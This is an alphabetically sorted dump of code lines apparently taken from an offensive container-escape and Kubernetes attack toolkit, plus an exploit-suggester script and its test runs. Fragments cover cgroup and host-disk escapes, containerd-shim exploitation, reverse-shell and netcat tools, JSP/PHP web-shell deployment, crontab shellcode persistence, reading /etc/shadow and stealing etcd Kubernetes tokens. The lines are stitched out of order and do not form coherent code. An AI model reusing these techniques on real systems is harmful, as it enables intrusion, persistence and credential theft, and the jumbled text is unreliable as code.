"Reqs: pkg=linux-kernel,ver>=4.4,ver<=4.14.13,cmd:grep -qi rds /proc/modules,x86_64"
"Reqs: pkg=linux-kernel,ver>=4.4,ver<=4.14.8,CONFIG_BPF_SYSCALL=y,sysctl:kernel.unprivileged_bpf_disabled!=1"
"Reqs: pkg=linux-kernel,ver>=4.4.0,ver<4.9,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1"
"Reqs: pkg=linux-kernel,ver>=4.4.0,ver<=4.4.0,cmd:grep -qi ip_tables /proc/modules"
"Reqs: pkg=linux-kernel,ver>=5.7,ver<5.12,CONFIG_BPF_SYSCALL=y,sysctl:kernel.unprivileged_bpf_disabled!=1"
"Reqs: pkg=linux-kernel,ver>=5.8,ver<=5.16.11"
"Reqs: pkg=nagios,ver<4.2.4"
"Reqs: pkg=ntfs-3g,ver<2017.4"
"Reqs: pkg=openssh-server,ver>=6.8,ver<=6.9"
"Reqs: pkg=polkit,ver=0.96"
"Reqs: pkg=s-nail,ver<14.8.16"
"Reqs: pkg=samba,ver<=2.2.8"
"Reqs: pkg=screen,ver==4.5.0"
"Reqs: pkg=setroubleshoot,ver<3.2.22"
"Reqs: pkg=snapd,ver<2.37,cmd:[ -S /run/snapd.socket ]"
"Reqs: pkg=sudo,ver<1.8.31"
"Reqs: pkg=sudo,ver<1.9.5p2"
"Reqs: pkg=sudo,ver<=1.8.20,cmd:[ -f /usr/sbin/getenforce ]"
"Reqs: pkg=sudo,ver>=1.8.0,ver<=1.8.3"
"Reqs: pkg=systemtap,ver<=1.3"
"Reqs: pkg=udev,ver<141"
"Reqs: pkg=udev,ver<141,cmd:[[ -f /etc/udev/rules.d/95-udev-late.rules "
"Reqs: pkg=xorg-x11-server-Xorg,cmd:[ -u /usr/bin/Xorg ]"
"ResponseMatch: ""availability_zone"","
"ResponseMatch: ""azEnvironment"","
"ResponseMatch: ""deviceName"","
"ResponseMatch: ""instance-id"","
"ResponseMatch: ""instance-name"","
"ResponseMatch: ""uhost-id"","
"Running commands like in Linux, little different in input-args, see the usage link."
"Running with target: /etc/shadow, ref: /etc/hostname"
"SHORTOPTS=""hVfbsu:k:dp:g"""
"SORTED_EXPLOITS=($(sort -r <<<""${exploits_to_sort["
"ScanPort(ip, port, timeout)"
"SearchLocalFileText(""../../test"")"
"Server:    """", // default"
"Server:    """","
"Server:    addr, // default"
"Server:    addr,"
"Server:    serverAddr, // default"
"Server:    serverAddr,"
"Server: ""https://"" "
"Server: kubeletEndpoint,"
"Server: target,"
"Silent:    true,"
"SkipExecutableFile: true,"
"StartDir: ""/"","
"Stderr:   ""/dev/null"","
"Stdin:    ""/dev/null"","
"Stdout:   ""/dev/null"","
"TCPPScan(ipRange, portFromTo, conf.TCPScannerConf.MaxParallel, timeout)"
"TCPPScan(ipRange, portFromTo, parallel, timeout)"
"TLSClientConfig: opt.TlsConfig,"
"T].{0,30}['"
"Tags: RHEL<=7,fedora=20"
"Tags: RHEL=5{systemtap:1.1-3.el5},fedora=13{systemtap:1.2-1.fc13}"
"Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2"
"Tags: RHEL=6,ubuntu=10.04"
"Tags: RHEL=6,ubuntu=12.04{kernel:3.2.0-(23"
"Tags: debian=8,ubuntu=14.04"
"Tags: debian=8,ubuntu=16.04"
"Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25"
"Tags: fedora=19{abrt:2.1.5-1.fc19},fedora=20{abrt:2.2.2-2.fc20},fedora=21{abrt:2.3.0-3.fc21},RHEL=7{abrt:2.1.11-12.el7}"
"Tags: mint=19,ubuntu=18"
"Tags: ubuntu=14.04,fedora=22"
"Tags: ubuntu=16.04,manjaro=16.10"
"Tags: ubuntu=16.04{network-manager-vpnc:1.1.93-1},debian=9.0{network-manager-vpnc:1.2.4-4},manjaro=17"
"Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1"
"Tags: ubuntu=18.04{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}"
"Tags: ubuntu=18.10,mint=19"
"Tags: ubuntu=7.10,RHEL=4,fedora=4"
"Tags: ubuntu=8.10,RHEL=4"
"Terminal: false,"
"This command will run the scripts below without local file scanning, using "
"This is the function test script, see doc: "
"Timeout: 1,"
"TlsConfig: tlsConfig,"
"To:   1,"
"To:   2,"
"To:   5,"
"To:   to,"
"Token:  token,"
"TokenPath = """""
"TokenPath: """","
"TokenPath: TokenPath,"
"TokenPath: tokenPath,"
"UNAME_A="""""
"U].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}"","
"Unless required by applicable law or agreed to in writing, software"
"WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"WarnPrefix  = ""[WARN_]  """
"Y].{0,30}['"
"[ ""$opt_full"" = ""true"" ] "
"[ ""$opt_kernel_version"" = ""true"" ] "
"[ ""$opt_show_dos"" == ""false"" ] "
"[ -n ""$KERNEL"" ] "
"[ -n ""$config"" ] "
"[ -n ""$tag_pkg_num"" ] "
"[ -z ""$src_url"" ] "
"[ -z ""$tags"" ] "
"[CVE"" -A 10 "
"[ERROR] ubuntu:latest while running cmd: docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric kcurl"""
"[ERROR] ubuntu:latest while running cmd: docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric nc"""
"[TEST] [ECS] echo ""AKIA99999999999999AB"" > /tmp/ak-leakage"
"[TEST] [alpine:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm --net=host alpine:latest /bin/sh -c ""/cdk-fabric evaluate --full"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric """
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric --help"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric -v"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric ifconfig"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric kcurl"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric nc"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric probe 1.1.1.1 22 10 1000"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric probe 1.1.1.1 22 50-999999 1000"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric probe"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric ps"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run ak-leakage"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run docker-sock-check /var/run/docker.sock"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run docker-sock-check"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run docker-sock-deploy /var/run/docker.sock alpine:latest"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run docker-sock-deploy"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run mount-cgroup "
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run mount-cgroup"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run mount-disk"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run mount-procfs"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run reverse-shell"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run service-probe 127.0.0.1"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run service-probe 192.168.1.1-"
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric run service-probe"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric ucurl"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c ""/cdk-fabric vi"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm --net=host ubuntu:latest /bin/sh -c ""/cdk-fabric evaluate --full"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm --net=host ubuntu:latest /bin/sh -c ""/cdk-fabric run --list"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm --net=host ubuntu:latest /bin/sh -c ""/cdk-fabric run shim-pwn "
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm --privileged=true ubuntu:latest /bin/sh -c ""/cdk-fabric run mount-cgroup "
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm --privileged=true ubuntu:latest /bin/sh -c ""/cdk-fabric run mount-disk"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm -v /proc:/host_proc ubuntu:latest /bin/sh -c ""/cdk-fabric run mount-procfs /host_proc "
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm -v /tmp/ak-leakage:/tmp/ak-leakage ubuntu:latest /bin/sh -c ""/cdk-fabric run ak-leakage /tmp"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm -v /var/run/docker.sock:/var/run/docker.sock ubuntu:latest /bin/sh -c ""/cdk-fabric run docker-sock-check /var/run/docker.sock"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm -v /var/run/docker.sock:/var/run/docker.sock ubuntu:latest /bin/sh -c ""/cdk-fabric run docker-sock-deploy /var/run/docker.sock alpine:latest"""
"[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm -v /var/run/docker.sock:/var/run/docker.sock ubuntu:latest /bin/sh -c ""/cdk-fabric ucurl get /var/run/docker.sock http://127.0.0.1/info "
"[a-zA-Z],,g"" "
"] $NAME"""
"] Checking kubelet endpoint: %s"", kubeletEndpoint)"
"] Found /var/log mount success, mount point: %s"", mount.MountPoint)"
"] Get log file success, file content: "
"] You can write the host file '%s' in file path: %s"", targetFile, filepath)"
"] kubelet log access success, url: %s, response length: %d"", kubeletEndpoint, len(respText))"
"] run ifconfig, using GetLocalAddresses()"")"
"] run netstat, using RunNestat()"")"
"]}""))"
"_ ""embed"""
"_ ""github.com/cdk-team/CDK/pkg/exploit"" // register all exploits"
"_ ""github.com/cdk-team/CDK/pkg/exploit/credential_access"""
"_ ""github.com/cdk-team/CDK/pkg/exploit/discovery"""
"_ ""github.com/cdk-team/CDK/pkg/exploit/escaping"""
"_ ""github.com/cdk-team/CDK/pkg/exploit/persistence"""
"_ ""github.com/cdk-team/CDK/pkg/exploit/privilege_escalation"""
"_ ""github.com/cdk-team/CDK/pkg/exploit/remote_control"""
"_ ""github.com/cdk-team/CDK/pkg/task""    // register all task"
"_ = filepath.Walk(StartDir, func(path string, info os.FileInfo, err error) error {"
"_, err := exec.LookPath(""bash"")"
"_, err := exec.LookPath(""fdisk"")"
"_, err := exec.LookPath(cmd)"
"_, err := os.Stat(""/sys/fs/cgroup/cgroup.controllers"")"
"_, err := os.Stat(""/usr/bin/debugfs"")"
"_, err := os.Stat(path)"
"_, err = cmdFile.WriteAt([]byte(content), n)"
"_, err = file.Write([]byte(content))"
"_, resBytes, _ := srcDecoder.Translate(p, true)"
"_, srvs, err := net.LookupSRV("""", """", name)"
"a]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})"","
"absPath = strings.TrimSuffix(absPath, ""/merged"")"
"act, _ := GetTaskPortListByString(""1,2,3-5"")"
"actParams := len(pattern.FindAllStringSubmatch(string(actualStdout), -1))"
"addCaps = append(addCaps, c)"
"addProcCmd := exec.Command(""/bin/sh"", ""-c"", ""sleep 2"")"
"addr, err := kubectl.ApiServerAddr()"
"addrs, err := i.Addrs()"
"analysis_url=$(echo ""$EXP"" "
"ans = append(ans, cmd)"
"ans, err := regexp.MatchString(conf.SensitiveEnvRegex, env)"
"ans, err := regexp.MatchString(conf.SensitiveProcessRegex, proc.Executable())"
"ans, err := util.HttpSendJson(""GET"", url, """")"
"ans, err := util.HttpSendJson(""POST"", url, """")"
"ans, err := util.HttpSendJson(args[0], args[1], args[2])"
"ans, err := util.UnixHttpSend(""post"", path, ""http://127.0.0.1/containers/create"", payloadData)"
"ans, err := util.UnixHttpSend(""post"", path, ""http://127.0.0.1/images/create"
"ans, err := util.UnixHttpSend(args[0], args[1], args[2], args[3])"
"ans, err = util.HttpSendJson(""POST"", url, """")"
"ans, err = util.HttpSendJson(""POST"", url, payloadData)"
"ans, err = util.UnixHttpSend(""post"", path, ""http://127.0.0.1/containers/"""
"apiServerPod, err := findApiServerPodInMasterNode(tokenFlag, addr)"
"apiVersion = ""apps/v1"""
"apiVersion = ""extensions/v1beta1"""
"apiVersion, err := getApiVersion(serverAddr)"
"args := Args[""<args>""].([]string)"
"args := cli.Args[""<args>""].([]string)"
"args = append(args, ""memory"")"
"args, err := docopt.ParseArgs(BannerContainer, os.Args[1:], BannerVersion)"
"args: []string{""./cdk_cli_path"", ""eva""},"
"args: []string{""./cdk_cli_path"", ""ifconfig""},"
"args: []string{""./cdk_cli_path"", ""run"", ""test-poc""},"
"assert.Equal(t, expParams, actParams, ""That should be equal"")"
"assert.Equal(t, expect, act, ""That should be equal"")"
"assert.Equal(t, v.expected, IsDir(v.dir), ""That should be equal"")"
"assert.Equal(t, v.expected, IsSoftLink(v.dir), ""That should be equal"")"
"assert.False(t, EnableSysPtraceCap(0x00000000a80425fb))"
"assert.True(t, EnableSysPtraceCap(0x00000000a80c25fb))"
"assert.True(t, EnableSysPtraceCap(0x0000003fffffffff))"
"assert.True(t, strings.Contains(value, """"), ""return True."")"
"authorizationHeader := fmt.Sprintf(""Basic %s"", sEnc)"
"availSubSys, err := util.GetAllCGroupSubSystem()"
"availSubSyses, err := util.GetAllCGroup()"
"available: CONFIG_SECURITY_DMESG_RESTRICT=y,ver>=2.6.37"
"available: CONFIG_SLUB_DEBUG_ON=y,cmd:! grep 'slub_debug=-' /proc/cmdline"
"available: CONFIG_STACKPROTECTOR_STRONG=y,ver>=3.14"
"b, err := ioutil.ReadAll(f)"
"b64 ""encoding/base64"""
"b64key := base64.StdEncoding.EncodeToString([]byte(strings.TrimSuffix(key, """
"base = fmt.Sprintf(""%s.%s.%s"", tIp[0], tIp[1], tIp[2])"
"base, start, end, err := GetTaskIPList(ps.ipRange)"
"bin_url=$(echo ""$EXP"" "
"blockId := strings.Split(fields[2], "":"")"
"body, _ := ioutil.ReadAll(resp.Body)"
"body, err := util.UnixHttpSend(""get"", path, ""http://127.0.0.1/info"", """")"
"bodyBytes, _ := ioutil.ReadAll(resp.Body)"
"buf := make([]byte, udpBufSize)"
"buffer, err := ioutil.ReadAll(os.Stdin)"
"buffer.String(),"
"buffer.WriteString(""Attack the kubelet endpoint."")"
"buffer.WriteString(""Connect to etcd and get token of k8s. "")"
"buffer.WriteString(""Exploit container escape with kubelet log access "
"buffer.WriteString(""If there is one argument, the first argument is the target file to read. "")"
"buffer.WriteString(""Notice to choose anonymous"
"buffer.WriteString(""Read files from host or chroot to host and spawn a cmd. "")"
"buffer.WriteString(""Support anonymous access or token designation."")"
"buffer.WriteString(""The First argument is file bind-mounted to container from host (default: %s), "")"
"buffer.WriteString(""Usage: cdk run etcd-get-k8s-token (anonymous"
"buffer.WriteString(""Usage: cdk run k8s-kubelet-var-log-escape /root/targetfile-to-read"")"
"buffer.WriteString(""Usage: cdk run kubelet-exec (list"
"buffer.WriteString(""When second argument is "
"buffer.WriteString(""the second argument specifies which file to read (default: %s), "")"
"buffer.WriteString(""the third and remaining arguments specifies command executed in host root filesystem (default: %s). "")"
"build !no_abuse_unpriv_userns,linux"
"build !no_lxcfs_rw,linux"
"build !no_mount_cgroup,linux"
"build !thin,!no_containerd_shim_pwn"
"build !thin,!no_containerd_shim_pwn,!no_k8s_shadow_apiserver,linux"
"build !thin,!no_k8s_shadow_apiserver"
"build !thin,!no_netcat_tool"
"build !thin,!no_vi_tool"
"build linux,!no_cap_dac_read_search"
"caData, err := ioutil.ReadFile(etcdCa)"
"cache, remain = rand.Int63(), letterIdxMax"
"capTextList = append(capTextList, CAPStringsList[i])"
"caps, err := capability.CapHexParser(capStr)"
"case ""CAP_DAC_READ_SEARCH"":"
"case ""CAP_SYS_ADMIN"":"
"case ""CAP_SYS_MODULE"":"
"case ""GET"":"
"case ""POST"":"
"case ""anonymous"":"
"case ""auto"":"
"case ""day"":"
"case ""dcurl"":"
"case ""default"":"
"case ""ectl"":"
"case ""exec"":"
"case ""freebsd"":"
"case ""get"":"
"case ""hour"":"
"case ""ifconfig"":"
"case ""jsp"":"
"case ""kcurl"":"
"case ""linux"":"
"case ""list"":"
"case ""min"":"
"case ""netstat"":"
"case ""php"":"
"case ""post"":"
"case ""probe"":"
"case ""ps"":"
"case ""ucurl"":"
"case ""vi"":"
"case ""windows"":"
"cert, err := tls.LoadX509KeyPair(etcdCert, etcdCertKey)"
"cgSyses, err := GetAllCGroup()"
"cgVer, err := util.GetCgroupVersion()"
"cginfo = append(cginfo, CgroupInfo{hID, singleCG[1], singleCG[2], originalInfo})"
"cgroupInfoPath := fmt.Sprintf(""/proc/%s/cgroup"", pidStr)"
"cgroupLst, err := util.GetCgroup(1)"
"cgroupLstSelf, err := util.GetCgroup(0)"
"cmd := cli.Args[""<cmd>""].(string)"
"cmd := exec.Command(""/bin/bash"", ""-c"", command)"
"cmd := exec.Command(""fdisk"", ""-l"")"
"cmd := exec.Command(""mount"", ""-t"", ""cgroup"", ""-o"", ""devices"", ""devices"", deviceCGroupPath)"
"cmd := exec.Command(""mount"", device, mountDir)"
"cmd := exec.Command(cmdSlice[0], cmdSlice[1:]...)"
"cmd := exec.Command(kubectlPath, args...)"
"cmd := exec.Command(os.Args[0], os.Args[1:]...)"
"cmd = exec.Command(""/bin/csh"")"
"cmd = exec.Command(""/bin/sh"")"
"cmd = exec.Command(""cmd.exe"")"
"cmd = strings.Replace(cmd, """
"cmdFile, err := os.OpenFile(path, os.O_TRUNC"
"cmdStdout="""""
"command = fmt.Sprintf(""./%s ."", shellPath)"
"comments=$(echo ""$EXP"" "
"config, err := dumpPodConfig(tokenFlag, addr, apiServerPod, ""kube-system"")"
"config.Command, ""e"", false, ""shell mode"")"
"config.Help, ""help"", false, ""print this help"")"
"config.Host, ""h"", ""0.0.0.0"", ""host addr to connect or listen"")"
"config.Listen, ""l"", false, ""listen mode"")"
"config.Network, ""n"", ""tcp"", ""network protocol"")"
"config.Port, ""p"", 4000, ""host port to connect or listen"")"
"config.Verbose, ""v"", false, ""verbose mode"")"
"config=$(echo ""$REQ"" "
"configJson = strings.Replace(configJson, ""$SHELLCMD$"", payloadShellCmd, -1)"
"conn, err := listener.Accept()"
"conn, err := net.Dial(""tcp"", connectString)"
"conn, err := net.Dial(""unix"", """
"conn, err := net.Dial(network, dailAddr)"
"conn, err := net.DialTimeout(""tcp"", target, timeout)"
"conn, err := net.ListenPacket(network, listenAddr)"
"const cgroupDevicePath string = ""/sys/fs/cgroup/devices"""
"const cgroupInfoPath string = ""/proc/self/cgroup"""
"const devicesAllowName string = ""devices.allow"""
"const devicesListName string = ""devices.list"""
"const hostDeviceFlag string = ""/etc/hosts"""
"const mountInfoPath string = ""/proc/self/mountinfo"""
"constraints, _ := version.NewConstraint("">=v1.16"")"
"container := c.Get(""name"").String()"
"containers := item.Get(""spec.containers"").Array()"
"content = strings.ReplaceAll(conf.WebShellCodeJSP, ""$SECRET_PARAM"", param)"
"content = strings.ReplaceAll(conf.WebShellCodePHP, ""$SECRET_PARAM"", param)"
"content, err := ioutil.ReadAll(resp.Body)"
"corePatternPayload := fmt.Sprintf("""
"cronJobConfig = strings.ReplaceAll(cronJobConfig, ""$IMAGE"", image)"
"cronJobConfig = strings.ReplaceAll(cronJobConfig, ""$SCHEDULE_EXPR"", scheduleExpr)"
"cronJobConfig = strings.ReplaceAll(cronJobConfig, ""$SHELL_CMD"", inputArgs)"
"crontabCMD := wrapShellCMDWithCrontab("""
"crontabCMD := wrapShellCMDWithCrontab(""/host/etc/crontab"", shellCommand, """
"curExePath, err := os.Executable()"
"cv := gjson.Get(resp, ""etcdcluster"").String()"
"dailAddr := net.JoinHostPort(host, strconv.Itoa(port))"
"data, _ := json.MarshalIndent(info, """", ""  "")"
"data, err := ioutil.ReadFile(""/proc/net/unix"")"
"data, err := ioutil.ReadFile(""/proc/self/mounts"")"
"data, err := ioutil.ReadFile(""/proc/self/status"")"
"data, err := ioutil.ReadFile(""/proc/sys/kernel/unprivileged_userns_clone"")"
"data, err := ioutil.ReadFile(ASLRSetting)"
"data, err := ioutil.ReadFile(RouteLocalNetProcPath)"
"data, err := ioutil.ReadFile(p)"
"data, err := ioutil.ReadFile(path)"
"data, err := json.Marshal(res)"
"datafd, err := os.Open(cgroupInfoPath)"
"deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1"
"deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}"
"def check_host_evaluate(cmd, white_list, black_list, verbose=False):"
"def check_host_exec(cmd_parsed, white_list, black_list, verbose=False):"
"def check_pod_exec(cmd, white_list, black_list, verbose=False):"
"def check_selfbuild_k8s_pod_exec(cmd, white_list, black_list, verbose=False):"
"def inside_container_cmd(image, docker_args, cmd, white_list, black_list, verbose=False):"
"def k8s_master_ssh_cmd(cmd_parsed, white_list, black_list, verbose=False):"
"def output_err(env, cmd, pattern, type):"
"default (need CA Cert). "")"
"default) <endpoint> <cert> <cert_key> <ca>"")"
"defaultEndpoint    = ""http://127.0.0.1:2379"""
"defaultEtcdCa      = ""/etc/kubernetes/pki/etcd/ca.crt"""
"defaultEtcdCert    = ""/etc/kubernetes/pki/etcd/peer.crt"""
"defaultEtcdCertKey = ""/etc/kubernetes/pki/etcd/peer.key"""
"defaultRef    = ""/etc/hostname"""
"defaultRef,"
"defaultShell  = ""/bin/bash"""
"defaultShell,"
"defaultTarget = ""/etc/shadow"""
"defaultTarget,"
"dev := util.MakeDev(deviceMarjor, deviceMinor)"
"dev := util.MakeDev(mi.Major, mi.Minor)"
"deviceCGroupPath = fmt.Sprintf(""/tmp/%s_%s"", filePreString, taskRandString)"
"devices = append(devices, info.Device)"
"devicesAllowPath := """""
"devicesAllowPath = path.Join(targetMountPoint, ""cgroup/devices"", podCgroupPath, devicesAllowName)"
"devicesListPath = path.Join(targetMountPoint, ""cgroup/devices"", podCgroupPath, devicesListName)"
"dial(config.Network, config.Host, config.Port, config.Command)"
"dir, err := os.Getwd()"
"dir:      ""/Users/xy/"","
"dir:      ""/Users/xy/go"","
"dir:      ""/etc/hosts"","
"dirname ""${current_file}"""
"dirname ""${pdir}"""
"dirname ""${ppdir}"""
"disabled=""[ ${txtred}Disabled${txtrst} ]"""
"distributed under the License is distributed on an ""AS IS"" BASIS,"
"dnsNames := []string{""any.any.svc.cluster.local."", ""any.any.any.svc.cluster.local.""}"
"dockerAbsPath := filepath.Join(absPath, ""merged"", localBundlePath)"
"docopt.PrintHelpAndExit(nil, BannerContainer)"
"dos=$(echo ""$EXP"" "
"dumpPSPBlockRule(addr, args[0])"
"dumpPSPBlockRule(addr, conf.K8sSATokenDefaultPath)"
"e[0m"""
"echo ""${"
"echo ""Additional checks (CONFIG_"
"echo ""Architecture: $([ -n ""$ARCH"" ] "
"echo ""CVE: $cve"""
"echo ""Checking requirement: $1"""
"echo ""Distribution: $([ -n ""$OS"" ] "
"echo ""operator: $operator"""
"echo ""pkg: $pkg"""
"echo ""required version: $version"""
"echo ""version: $pkgVersion"""
"echo -e """
"echo -e ""$NAME "
"echo -e ""${bldwht}Available information:${txtrst}"""
"echo -e ""${bldwht}Possible Exploits:${txtrst}"""
"echo -e ""${bldwht}Searching among:${txtrst}"""
"echo -e ""Distribution version: $([ -n ""$DISTRO"" ] "
"echo -e ""Package listing: $([ -n ""$pkgListFile"" ] "
"echo -e ""["
"elif $(echo ""$src_url"" "
"elif [ ""$opt_checksec_mode"" = ""true"" ]"
"elif [ ""$opt_cvelist_file"" = ""true"" ]"
"elif [ ""$opt_uname_string"" == ""true"" ]"
"elif [ -n ""$PKGLIST_FILE"" ]"
"elif [ -n ""$PKG_LIST"" ]"
"elif [[ ""$src_url"" ="
"enabled=""[ ${txtgrn}Enabled${txtrst}  ]"""
"end, _ = strconv.Atoi(fromTo[1])"
"err := ContainerdPwn("""", rhost, rport)"
"err := ContainerdPwn(shellCmd, """", """")"
"err := GetK8sSATokenViaCreatePod(token, targetServiceAccount, remoteIP, remotePort)"
"err := WriteFileAdd(filePath, shellcode)"
"err := deployWebShell(fileType, path)"
"err := escaping.ContainerdPwn(shellCommand, """", """")"
"err := ioutil.WriteFile(path, d, 0666)"
"err := newDevicesCgroup(""cdk_dcgroup"")"
"err := os.MkdirAll(mountDir, os.ModePerm)"
"err := os.Setenv(""GOTRACEBACK"", ""crash"")"
"err := util.WriteFile(path, content)"
"err := util.WriteShellcodeToCrontab("""
"err = DockerAPIPull(sock, ""alpine:latest"")"
"err = DockerAPIRun(sock, cmd)"
"err = EscapeCgroup(cmd, subSysName)"
"err = containerdShimApiExp(sockname, shellCmd, rhost, rport)"
"err = escaping.EscapeCgroup(shellCommand, ""memory"")"
"err = filepath.Walk(deviceCGroupPath, func(path string, info os.FileInfo, err error) error {"
"err = fmt.Errorf(""Invalid IP Range (eg. 1.1.1.1-3)"
"err = ioutil.WriteFile(outFile, []byte(expShellText), 0777)"
"err = ioutil.WriteFile(outFile, []byte(resp), 0666)"
"err = os.Mkdir(mountPointPath, DefaultFolderPerm)"
"err = os.WriteFile(kubectlPath, kubectlBinary, 0755)"
"err = syscall.Mknod(""./cdk_mknod_result"", syscall.S_IFBLK"
"err = syscall.Mknod(""./host_dev"", syscall.S_IFBLK"
"err = syscall.Mount(""cgroup"", mountPointPath, ""cgroup"", 0, subSystemName)"
"err, _ := AllDiskMount()"
"err, mountDir := MountToRandomTarget(device)"
"err, mountedDirs := escaping.AllDiskMount()"
"errMsg := fmt.Sprintf(""err found in post request, error response code: %v."", resp.Status)"
"errors.CDKRuntimeError{Err: e, CustomMsg: ""mount error. possible reason: target container is not privileged.""}, """""
"errors.CDKRuntimeError{Err: err, CustomMsg: ""HTTP Request failed.""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""Unix HTTP Request failed.""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""cannot create mountpoint""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""cannot determine cgroup version""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""cannot enable notify_on_release""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""cannot get cgroup info""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""check prerequisites error.""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""err found in post request.""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""err found while generate post request in net.http .""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""err found while getting K8s apiserver address.""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""err found while requesting K8s apiserver.""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""err found while stat docker.sock path.""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""err found while writing shellcode to host crontab from container.""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""fail to connect unix socket "" "
"errors.CDKRuntimeError{Err: err, CustomMsg: ""failed to create container via unix socket http request.""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""failed to pull docker image via unix socket http request.""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""failed to send http request to unix socket.""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""failed to start container via unix socket http request.""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""failed to write file.""}"
